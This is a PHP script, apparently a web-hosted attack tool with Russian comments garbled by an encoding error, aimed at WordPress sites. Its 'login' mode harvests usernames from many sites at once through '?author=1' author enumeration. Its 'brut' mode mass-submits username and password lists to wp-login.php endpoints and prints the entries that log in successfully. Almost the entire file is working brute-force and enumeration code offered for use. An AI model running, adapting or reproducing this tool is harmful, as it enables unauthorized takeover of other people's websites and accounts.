<?php
ini_set('max_execution_time',0);
ini_set('memory_limit', '1024M');
ini_set("display_errors",0);

function multiCurl($data, $options = array()) 
{
  $curls = array();
  $result = array();
  $mh = curl_multi_init();
  foreach ($data as $id => $d) {

    $curls[$id] = curl_init();
    $url = (is_array($d) && !empty($d['url'])) ? $d['url'] : $d;
    // ≈сли $d это массив (как в случае с пост), то достаем из массива url
    // если это не массив, а уже ссылка - то берем сразу ссылку

    curl_setopt($curls[$id], CURLOPT_URL,            $url);
    curl_setopt($curls[$id], CURLOPT_HEADER,         1);
	curl_setopt($curls[$id], CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($curls[$id], CURLOPT_TIMEOUT, 10);
    curl_setopt($curls[$id], CURLOPT_RETURNTRANSFER, 1);
	$headers = array
	(
		'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8',
		'Accept-Language: ru,en-us;q=0.7,en;q=0.3',
		'Accept-Encoding: deflate',
		'Accept-Charset: windows-1251,utf-8;q=0.7,*;q=0.7',
		'User-agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
		'Cookie: wordpress_test_cookie=WP Cookie check; path=/'
	); 
	curl_setopt($curls[$id], CURLOPT_HTTPHEADER, $headers); 

    // ≈сли у нас есть пост данные, тоесть запрос отправл€етс€ постом 
    // устанавливаем флаги и добавл€ем сами данные
    if (is_array($d) && !empty($d['post'])) 
    {
        curl_setopt($curls[$id], CURLOPT_POST,       1);
        curl_setopt($curls[$id], CURLOPT_POSTFIELDS, $d['post']);
    }
    if (count($options)>0) curl_setopt_array($curls[$id], $options);
	
    curl_multi_add_handle($mh, $curls[$id]);
  }
  $running = null;

  do { curl_multi_exec($mh, $running); } while($running > 0);

  // —обираем из всех созданных механизмов результаты, а сами механизмы удал€ем
  foreach($curls as $id => $c) 
  {
    $result[$id] = curl_multi_getcontent($c);
    curl_multi_remove_handle($mh, $c);
  }

  // ќсвобождаем пам€ть от механизма мультипотоков
  curl_multi_close($mh);

  // возвращаем данные собранные из всех потоков.
  return $result;
}

if ($_POST['do']=='login')
{
	$urls = array();
	$urls = $_POST['urls'];
	$script = $_SERVER['REQUEST_URI'];
	$urls = explode("\r\n", $urls);
	$data = array();
	$i=0;

	foreach($urls as $url)
	{ 
		//echo file_get_contents('http://'.$_SERVER['SERVER_NAME'].$script.'?url='.$url.'&login=admin&pass=admin');
	   $data[$i] = array('url' =>  $url); 
	   $i++;
	} 


	$auth_result = multiCurl($data, $options = array());
	//print_r($auth_result);
	$i=0;
	foreach($auth_result as $res)
	{ 
		$user='';
		
		if( (strpos($res,"/author/")) and (strpos($res,"Location: ")) ) 
		{
			$url = $data[$i]['url'];
			$url = str_replace ("/?author=1", "", $url);
			preg_match_all ("'/author/(.*)'", $res, $user);
			$user = str_replace("/author/", "", $user);
			$user = str_replace("/", "", $user);
			$user = str_replace("/", "", $user[1][0]);
			echo ($url.";".trim($user)."\r\n");
			//continue;
		}
		if( (strpos($res,'<span class=""vcard">')) ) 
		{
			$url = $data[$i]['url'];
			$url = str_replace ("/?author=1", "", $url);
			preg_match_all ('<span class="vcard">(.*)</span>', $res, $user);
			$user = str_replace('<span class="vcard">', "", $user);
			$user = str_replace('</span>', "", $user);
			echo $url.";".$user[1][0]."\r\n";
			//continue;
		}
		if( (strpos($res,'rel="author">')) ) 
		{
			$url = $data[$i]['url'];
			$url = str_replace ("/?author=1", "", $url);
			preg_match_all ("'/author/.*/\" title'", $res, $user);
			$user = str_replace('/author/', "", $user[0]);
			$user = str_replace('/" title', "", $user[0]);
			echo $url.";".$user."\r\n";
			//continue;
		}
		if( (strpos($res,'rel="me">')) ) 
		{
			$url = $data[$i]['url'];
			$url = str_replace ("/?author=1", "", $url);
			preg_match_all ("'rel=\"me\">.*</a>'", $res, $user);
			$user = str_replace('rel="me">', "", $user);
			$user = str_replace('</a>', "", $user);
			echo $url.";".$user[0]."\r\n";
			//continue;
		}
		if( (strpos($res,'archive author author-')) ) 
		{
			$url = $data[$i]['url'];
			$url = str_replace ("/?author=1", "", $url);
			preg_match_all ("'archive author author-.* author-1'", $res, $user);
			$user = str_replace('archive author author-', "", $user[0][0]);
			$user = str_replace(' author-1', "", $user);
			echo $url.";".$user."\r\n";
			//continue;
		}
		$i++;
	}
}
if ($_POST['do']=='brut')
{	
	$urls = array();
	$urls = $_POST['urls'];
	$urls = explode("\r\n", $urls);
	$data = array();
	$i=0;
	foreach($urls as $url)
	{ 
		$link = explode(";", $url);
		$redirect_to = str_replace("wp-login.php", "wp-admin/", $link[0]);
		//echo file_get_contents('http://'.$_SERVER['SERVER_NAME'].$script.'?url='.$url.'&login=admin&pass=admin');
		$data[$i] = array('url' => $link[0], 'post' => 'log='.$link[1].'&pwd='.$link[2].'&testcookie=1&wp-submit=1&redirect_to='.$redirect_to); 
		$i++;
	} 
	$auth_result = multiCurl($data, $options = array());

	$i=0;
	foreach($auth_result as $res)
	{ 
		if( (strpos($res,"/wp-admin/")) && (strpos($res,"Location: ")) && (strpos($res,"wordpress_logged_in")) )
		{
			echo $urls[$i]."\r\n";
		}
		$i++;
	}
}
?>